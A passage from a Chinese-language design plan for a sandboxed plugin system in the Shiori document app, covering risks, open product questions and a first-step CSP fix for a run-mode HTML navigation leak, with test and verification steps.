- **P1b 改动面最大。** ⌘S 先于 editable guard 判断的语义一旦改错，Markdown 编辑器
  里的保存就会失效，所以单独做一条 E2E。
- **同线程卡死。** 如果 mobile WebView 上 opaque frame 和主页面共用渲染线程，看门狗
  会失效，这时逻辑要放进 Worker；Worker 也起不来的平台只开 T1。
- **移动端内存。** 每个 frame 都是一个文档上下文。Android 上同时激活的 T2 插件数先
  定为 3，超出的按 LRU 休眠。
- **维护面。** broker 表、RPC 方法表、manifest 校验三处要保持同步，用静态检查绑在
  一起。
- **范围膨胀。** 插件系统不能变成 [`PLAN-agent-native.md`](PLAN-agent-native.md) 否掉的那些东西的后门：托管
  agent、chat rail、API key。

## 需要 Jesse 拍板的问题

1. **要不要支持第三方代码（T2）？** 如果只要「内置功能插件化，方便以后扩展」，
   P0–P1（外加 P2 的无代码包）就是全部工作。要做第三方的话，插件能做的事只有：操作
   当前文档、在自己的 iframe 里画 UI，不能联网，不能读文件。这个范围够不够用？
2. **网络。** 插件永远不能联网，还是做一个 `network:<origin>` 权限：按 origin 授权、
   经 Rust 代理、安装时公示？后者就是一条官方的外传通道，和 local-first 的承诺有
   张力。
3. **商店版。** iOS 版要不要开 T2（App Review 4.7 对 mini apps / plug-ins 有额外
   条件，要按发布时的条款再核一次）？Play 版要不要只允许官方签名包？或者按 fact 10
   的思路，用构建期开关只在 direct-apk 和桌面版开放第三方安装？
4. **签名密钥与官方目录。** 插件签名私钥由谁持有，放进 `release` environment 还是
   单独管？官方目录收不收社区作者的包（由你复签）？
5. **第三方 locale 政策。** 选项有三个：
   - 严格照 fact 6，en / zh / ja 三份缺一份就拒装，代价是社区作者基本拿不出日语；
   - 只要求 `en`，zh / ja 回落到英文，插件页标「未翻译」；
   - 只要求 `en` 加作者声明的语言，界面语言不在其中时整个插件用英文。

   内置插件不受影响，永远三份齐全。
6. **`document.text` 的授权粒度。** 一次授权对所有文档有效，还是按文档（或按「本次
   会话」）授权？后者更符合 local-first，但打断用户更多。
7. **P1a 的 agent CLI 名单。** 除了 `claude`、`codex`，要加 `gemini`、`grok`，还是
   别的？加进去之后，只装了这些 CLI 的用户会看到追问控件，这是用户可见的行为变化，
   而且每加一个都要过一次真实终端的 E2E。
8. **T3 要不要分 token。** 现在 Live API 一把 token 拿全部权限。外部插件多起来以后，
   要不要每个客户端单独配对、单独限定路由（仍然不引入 MCP）？
9. **命令面板要不要做。** P1b 之后成本几乎为零（`commands.snapshot()` 加一个搜索
   框），但它是一个新 UI。
10. **run-mode HTML 与 T2 要不要共用容器代码（`src/sandbox/frame.ts`）。** 好处是
    F1 和 F5 这类修复只做一次；代价是改 run mode 时也要过插件探针。
11. **插件 overlay 的回读。** 别的 PDF 阅读器只看得到 `/Stamp` 外观。Shiori 回读
    `/ShioriExt` 时如果原插件没装，要不要提示去装？

## 第一步建议

**先把 F1 当成一个独立的 bug fix 推出去，不等插件方向定下来。** 它修的是一个已经
上线、而且和代码注释承诺相反的 run-mode 外传漏洞。改动只有两处，不碰 Rust，不碰
`tauri.conf.json`，也不影响 Cloudflare Web Analytics。

1. **先红。** 把本文 F1 那次 Chrome 实测固化成 `test-artifacts/plugins-sandbox-escape/`
   的第一版：一份 README 写明步骤，加一个 `report.json`，记录 web 现状下
   `location.href` 外跳被放行（allowed）。
2. **改。**
   - 新建 `public/_headers`：

     ```
     /*
       Content-Security-Policy: frame-src 'self' blob:
     ```

   - 删掉 `src/documents/runnableHtml.ts:200` 的 `"navigate-to 'none'",`，并把
     :182-184 的注释改成如实描述：挡住导航的是父文档的 `frame-src`，不是 frame 自己
     的 CSP。
3. **验证。**
   - `bun run build` 之后确认 `dist/_headers` 存在；
   - 用 `bun run dev` 不行，因为 dev server 不读 `_headers`。改用一个能读
     `_headers` 的静态服务器，或者用 `wrangler pages dev dist` 起本地 Pages，再跑同
     一个探针，结果应该从 allowed 变成 blocked；
   - 回归检查：静态预览 iframe（`DocumentViewerHtml.tsx:571`，
     `sandbox="allow-same-origin"`）照常渲染；run mode 里用户批准的远程脚本照常加载，
     Markdown 预览里的远程图片照常显示，Analytics beacon 没有被拦；
   - 跑 `bun run verify`。
4. **上线后。** 在 `app.shiori.nagi.fun` 上用 DevTools 确认响应头生效，再跑一次
   探针，把线上结果补进产物。

紧接着、同样不依赖插件方向的是 **F5 的 Windows 实测**。它回答的是「今天 Windows 上
的 run-mode HTML 能不能调用 Tauri 命令」，结论决定这是另一个要立刻修的漏洞，还是
只是插件 T2 在 Windows 上的门槛。两件事做完之后，再从 P0c（`OVERLAY_KINDS`）和
P1a（agent CLI const 表）里挑一件开工。这两件都不需要第三方插件这个决定，各自修掉
一个已知问题。